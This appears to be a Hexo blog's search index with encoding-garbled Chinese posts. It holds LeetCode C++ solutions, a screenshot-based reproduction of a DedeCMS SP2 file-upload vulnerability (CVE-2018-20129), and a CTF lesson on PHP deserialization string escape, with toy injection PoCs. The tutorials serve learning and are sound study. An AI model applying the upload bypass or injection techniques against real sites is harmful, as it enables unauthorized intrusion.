<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ç®—æ³•ç»ƒä¹ </title>
      <link href="2023/03/02/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
      <url>2023/03/02/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Leetcode-1ï¼šä¸¤æ•°ä¹‹å’Œ"><a href="#Leetcode-1ï¼šä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="Leetcode-1ï¼šä¸¤æ•°ä¹‹å’Œ"></a>Leetcode-1ï¼šä¸¤æ•°ä¹‹å’Œ</h2><p><img src="https://tva1.sinaimg.cn/large/008vOhrAly1hblbu8dehyj30v00r40ux.jpg" alt=""></p><h3 id="æ–¹æ³•ä¸€ï¼šæš´åŠ›å¾ªç¯"><a href="#æ–¹æ³•ä¸€ï¼šæš´åŠ›å¾ªç¯" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæš´åŠ›å¾ªç¯"></a>æ–¹æ³•ä¸€ï¼šæš´åŠ›å¾ªç¯</h3><p>æ€è·¯å°±æ˜¯ä¸¤å±‚å¾ªç¯ï¼Œéå†æ•°ç»„å…ƒç´ ï¼Œæ±‚å’Œæ¯”è¾ƒæ˜¯å¦å’Œtargetç›¸ç­‰ï¼Œæ¯”è¾ƒæ— è„‘ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = nums[i] + nums[j];</span><br><span class="line">                <span class="keyword">if</span> (tmp == target)</span><br><span class="line">                    <span class="keyword">return</span> &#123;i, j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008vOhrAly1hbldog0e3ij30tw07o3z6.jpg" alt="image-20230302112454803"></p><h2 id="Leetcode-70ï¼šçˆ¬æ¥¼æ¢¯-é€’å½’"><a href="#Leetcode-70ï¼šçˆ¬æ¥¼æ¢¯-é€’å½’" class="headerlink" title="Leetcode-70ï¼šçˆ¬æ¥¼æ¢¯-é€’å½’"></a>Leetcode-70ï¼šçˆ¬æ¥¼æ¢¯-é€’å½’</h2><p>éš¾åº¦ï¼šç®€å•</p><p><img src="https://tva1.sinaimg.cn/large/008vOhrAly1hbl94100zaj30ta0pita5.jpg" alt=""></p><h3 id="æ–¹æ³•ä¸€ï¼šè®°å¿†åŒ–é€’å½’"><a href="#æ–¹æ³•ä¸€ï¼šè®°å¿†åŒ–é€’å½’" class="headerlink" title="æ–¹æ³•ä¸€ï¼šè®°å¿†åŒ–é€’å½’"></a>æ–¹æ³•ä¸€ï¼šè®°å¿†åŒ–é€’å½’</h3><p>ä¸€å¼€å§‹ç”¨æ™®é€šé€’å½’ï¼Œä¼šè¶…æ—¶ï¼Œæ‰€ä»¥ç”¨è®°å¿†åŒ–é€’å½’ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„å­˜å‚¨ä¸­é—´é€’å½’è®¡ç®—çš„ç»“æœï¼Œè¿™æ ·é€’å½’åˆ°æŸä¸ªå€¼æ—¶ï¼Œå…ˆæŸ¥è¯¢æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œå¦‚æœåœ¨ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œä¸åœ¨çš„è¯å°±è¿›è¡Œé€’å½’ï¼Œå¹¶å°†é€’å½’åçš„å€¼å­˜å…¥åˆ°æ•°ç»„ä¸­ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result = <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">46</span>, <span class="number">0</span>);    <span class="comment">// åˆå§‹å…ƒç´ ä¸º0</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (result[n])  <span class="keyword">return</span> result[n];</span><br><span class="line">            <span class="keyword">int</span> ret = climbStairs(n<span class="number">-1</span>) + climbStairs(n<span class="number">-2</span>);</span><br><span class="line">            result[n] = ret;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒï¼šåŒæŒ‡é’ˆè§£æ³•"><a href="#æ–¹æ³•äºŒï¼šåŒæŒ‡é’ˆè§£æ³•" class="headerlink" title="æ–¹æ³•äºŒï¼šåŒæŒ‡é’ˆè§£æ³•"></a>æ–¹æ³•äºŒï¼šåŒæŒ‡é’ˆè§£æ³•</h3><p>æ ¸å¿ƒæ€æƒ³å¦‚ä¸‹ï¼šå‡è®¾ç¬¬ä¸€ä¸ªæŒ‡é’ˆn1æŒ‡å‘1ï¼Œç¬¬äºŒä¸ªæŒ‡é’ˆn2æŒ‡å‘2ï¼Œé‚£ä¹ˆå¦‚æœè¦æ±‚n=4çš„æƒ…å†µï¼Œå°±ä»åº•éƒ¨å‘é¡¶éƒ¨å¾ªç¯ï¼Œå…ˆæ±‚n=3ï¼Œå†æ±‚n=4ã€‚n=3æ—¶ï¼Œç»“æœä¸ºn1+n2 = 3ï¼Œæ­¤æ—¶å°†ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«å‘åç§»åŠ¨ï¼Œn1æŒ‡å‘2ï¼Œn2æŒ‡å‘3ï¼Œå½“n=4æ—¶å†é‡å¤ä»¥ä¸Šæ­¥éª¤ã€‚</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> pre = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> prePre = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result = pre + prePre;</span><br><span class="line">            prePre = pre;</span><br><span class="line">            pre = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ­¤è§£æ³•æ€§èƒ½æ›´ä¸ºä¼˜è¶Š</p><p><img src="https://tva1.sinaimg.cn/large/008vOhrAly1hblbsv85rlj30ti0bcgmg.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-20129-dedecms-SP2å‰å°æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æå¤ç°</title>
      <link href="2021/11/05/SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/11/05/SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é¦–å…ˆå»å®˜ç½‘ä¸‹è½½dedecmsçš„æºç åˆ°æœ¬åœ°<br>ç”±äºæˆ‘æ˜¯macç¯å¢ƒï¼Œå°±ç”¨äº†MAMP Proï¼Œwinä¸‹å¯ä»¥ä½¿ç”¨æ–¹ä¾¿çš„phpstudy</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4csbaf9mj31ej0u0jvp.jpg" alt=""></p><p>åœ¨webç«¯è®¿é—®å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cuqdyfwj31kr0u00ym.jpg" alt=""></p><p>å¡«å†™å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cwv341vj30zu0u0goq.jpg" alt=""></p><p>ç½‘ç«™æ­å»ºå®Œæˆï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4cytckujj31c40u0n0c.jpg" alt=""></p><p>ä½¿ç”¨ripsä»£ç å®¡è®¡ç³»ç»Ÿè¿›è¡Œæ¼æ´æ‰«æ</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dbm3t24j31680u0ahp.jpg" alt=""></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4do25f60j31uc0o0mze.jpg" alt=""></p><p>æ¼æ´é¡µé¢ä½äºä¼šå‘˜ç”¨æˆ·çš„ç›¸å…³æ“ä½œä¸­ï¼Œæˆ‘ä»¬ç‚¹å‡»æ³¨å†Œè´¦å·çš„æ—¶å€™ï¼Œæç¤ºä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dozrwu2j31000igjrv.jpg" alt=""></p><p>æˆ‘ä»¬éœ€è¦è¿›åˆ°é…ç½®é¡µé¢å¼€å¯ä¼šå‘˜åŠŸèƒ½ï¼Œåå°é»˜è®¤è·¯ç”±ä¸º/uploads/dedeï¼Œé»˜è®¤ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯admin</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4drmxsklj31im0u0whh.jpg" alt=""></p><p>åœ¨ä¼šå‘˜è®¾ç½®ä¸­æ‰“å¼€ä¼šå‘˜åŠŸèƒ½</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4du9l8p7j31os0u0jzq.jpg" alt=""></p><p>æ³¨å†Œä¸ªç”¨æˆ·å‡ºæ¥</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211105170629758.png" alt=""></p><p>æ³¨å†ŒæˆåŠŸåï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dya4z7qj31lv0u0jv8.jpg" alt=""></p><p>ç‚¹å‡»ä¸ªäººç©ºé—´åï¼Œå‘ç°éœ€è¦éªŒè¯</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4dyh0d07j311s0fajs6.jpg" alt=""></p><p>æˆ‘ä»¬å…¨å±€æœç´¢è¯¥å­—ç¬¦ä¸²ï¼Œå‘ç°æœ‰ä¸€å¤„å¼•ç”¨ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e4fnrqxj31ky0qugpj.jpg" alt=""></p><p>çœ‹åˆ°æ˜¯æ ¹æ®<code>$_vars[&#39;spacesta&#39;]</code>è¿™ä¸ªå˜é‡æ¥ç¡®å®šæƒé™çš„ï¼Œæˆ‘ä»¬å†æ¬¡è¿›å…¥åå°ï¼Œæ‰¾åˆ°ç³»ç»Ÿè®¾ç½®-&gt;ä¼šå‘˜è®¾ç½®</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e4zs0psj317q0u078l.jpg" alt=""></p><p>çŒœæµ‹æ˜¯è¿™ä¸ªé€‰é¡¹è®¾ç½®äº†æƒé™ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸º0ï¼Œå†è¯•è¯•</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e7jm1pkj31800nk78p.jpg" alt=""></p><p>å†æ³¨å†Œä¸€ä¸ªç”¨æˆ·å‡ºæ¥</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211105171834324.png" alt=""></p><p>å‘ç°å·²ç»å¯ä»¥è®¿é—®ä¸ªäººç©ºé—´äº†</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4e9yphjwj31t90u0n14.jpg" alt=""></p><p>é€€å‡ºä¸ªäººç©ºé—´åï¼Œæˆ‘ä»¬ç‚¹å‡»å†…å®¹ä¸­å¿ƒ-åˆ†ç±»ä¿¡æ¯çš„å‘è¡¨æ–‡ç« çš„åŠŸèƒ½</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4edifiu5j31f20u077b.jpg" alt=""></p><p>ç®€å•åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡ğŸ´</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4ejzvi8dj30o609gabe.jpg" alt=""></p><p>å¼€å¯burpæŠ“åŒ…ï¼Œç„¶åé€‰æ‹©ä¸Šä¼ å›¾ç‰‡åˆ°æœåŠ¡å™¨ä¸Š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4f3l2x9qj31co0u0wge.jpg" alt=""></p><p>æˆåŠŸæˆªè·httpæŠ¥æ–‡</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4f4dehfhj31j70u0wol.jpg" alt=""></p><p>åˆ©ç”¨è¿™æ¡æ­£åˆ™æ¥bypass</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4kuzu8pvj319o0bi40n.jpg" alt=""></p><p>æ‰€ä»¥æˆ‘ä»¬å°†åŒ…æ”¹ä¸ºï¼š</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw4kvitwz2j31yl0u0nbh.jpg" alt=""></p><p>ä¸Šä¼ æˆåŠŸ</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CVE </tag>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤‡èµ›é€‰æ‹©é¢˜å¤§èµ›å†³èµ›ä¹‹è¢«è¿«æˆä¸ºwebæ‰‹</title>
      <link href="2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/"/>
      <url>2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><ul><li>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</li></ul><p>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å°±æ˜¯é€šè¿‡ç›®æ ‡ä»£ç çš„ä¸€äº›æ“ä½œæ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦æ¥å¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h4 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿é€ƒé€¸</h4><p>è§‚å¯Ÿå¦‚ä¸‹poc<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passsword</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;Test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:9:&quot;passsword&quot;;s:4:&quot;bbbb&quot;;&#125;</span></span><br><span class="line"><span class="variable">$tmp1</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp1</span>);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åœ¨ä»£ç ä¸­åŠ äº†ä¸€ä¸ªfilterå‡½æ•°ï¼Œæ¥å°†aæ›¿æ¢ä¸ºbbï¼Œæˆ‘ä»¬åˆ†åˆ«ç”¨filterå’Œä¸ç”¨filteråºåˆ—åŒ–åŒä¸€ä¸ªå¯¹è±¡è§‚å¯Ÿç»“æœã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsfvltgmgj30xu02qq3c.jpg" alt=""></p><p>å¯ä»¥çœ‹åˆ°å­—ç¬¦ä¸²å˜é•¿äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€è€ƒï¼Œå­—ç¬¦ä¸²å˜é•¿ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p><p>ç­”ï¼šæˆ‘ä»¬å¯ä»¥äººä¸ºæ„é€ æ¶æ„æ•°æ®ï¼Œå­—ç¬¦ä¸²å˜é•¿æ„å‘³ç€å¯ä»¥é€ƒé€¸ï¼Œå› ä¸ºç”±äºs:4çš„å­˜åœ¨ï¼Œè¯¥æˆå‘˜å˜é‡åªä¼šè¯»å–åå››ä¸ªå­—ç¬¦æ¥ä½œä¸ºè¯¥å˜é‡ï¼Œå¯¼è‡´è¿‡é•¿çš„éƒ¨åˆ†å¯ä»¥â€œé¡¶åˆ°â€åé¢å»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®æ¥ç¯¡æ”¹å…¶ä»–æˆå‘˜å˜é‡çš„å€¼ï¼Œæ¯”å¦‚åŠ ä¸Šâ€;}ä¹‹ç±»çš„æ¥é—­åˆæ•°æ®ï¼Œçœ‹å¦‚ä¸‹å®ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°è¯•ä¸åŠ filterï¼Œç„¶åæ­£å¸¸åºåˆ—åŒ–ï¼Œå‘ç°æ„é€ çš„æ¶æ„æ•°æ®é€ƒé€¸ä¸äº†ï¼Œå¹¶ä¸ä¼šå› ä¸ºåŒå¼•å·ä¹‹ç±»çš„ç‰¹æ®Šå­—ç¬¦è€Œé€ æˆé—­åˆå•¥çš„</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsgcrtc4lj315e04k0u1.jpg" alt=""></p><p>å¦‚æœæˆ‘ä»¬åŠ äº†filterä¼šå˜æˆè¿™æ ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>å› ä¸º<code>&#39;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>é•¿åº¦ä¸º36ï¼Œæ‰€ä»¥æˆ‘ä»¬æ•…æ„æŠŠfilteræŠŠadminæ›¿æ¢æˆé•¿ä¸º36çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±åé¢çš„<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>å°±å¯ä»¥é€ƒé€¸å‡ºå»ï¼Œé¡¶æ›¿æˆä¸ºç±»çš„æˆå‘˜å˜é‡ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsghr6fzrj31fk048dhb.jpg" alt=""></p><h4 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­é€ƒé€¸</h4><p>å…ˆè¯´æ ¸å¿ƒæ€æƒ³ï¼Œä¸Šæ–‡ä¸­æåˆ°çš„æ˜¯å­—ç¬¦ä¸²è¿‡é•¿ç„¶åå°†æ¶æ„æ•°æ®â€œé¡¶å‡ºå»â€ï¼Œä»è€Œå°†å…¶ä»–çš„ç±»æˆå‘˜å˜é‡ç¯¡æ”¹ï¼›å˜çŸ­é€ƒé€¸çš„æ ¸å¿ƒåŸç†æ˜¯å°†å­—ç¬¦ä¸²ç¼©çŸ­ï¼Œå°†phpè‡ªå·±è®°å½•çš„æ•°æ®å½“åšå­—ç¬¦ä¸²â€œç¼©å›æ¥â€ï¼Œä»è€Œä½¿åé¢çš„æ¶æ„æ•°æ®å¾—ä»¥é€ƒé€¸å‡ºå»ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹å¦‚ä¸‹filterï¼Œä¼šå°†13ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºï¼Œä¸ºå•¥é•¿åº¦æ˜¯13å‘¢ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬è¦å°†ç³»ç»Ÿæ•°æ®åŒ…å«è¿›å»çš„é•¿åº¦<code>&quot;;s:8:&quot;password&quot;;s:34:&quot;abc&quot;</code>ä¸º26ï¼Œæ­£å¥½æ˜¯13çš„å€æ•°ï¼Œæ–¹ä¾¿æ„é€ æ•°æ®é€ƒé€¸ï¼Œæˆ‘ä»¬ä¸”çœ‹ä¸‹æ–‡ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯æ²¡æœ‰åŠ filterçš„æƒ…å†µï¼Œå¾ˆæ­£å¸¸ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh5xzygyj31c603iwf1.jpg" 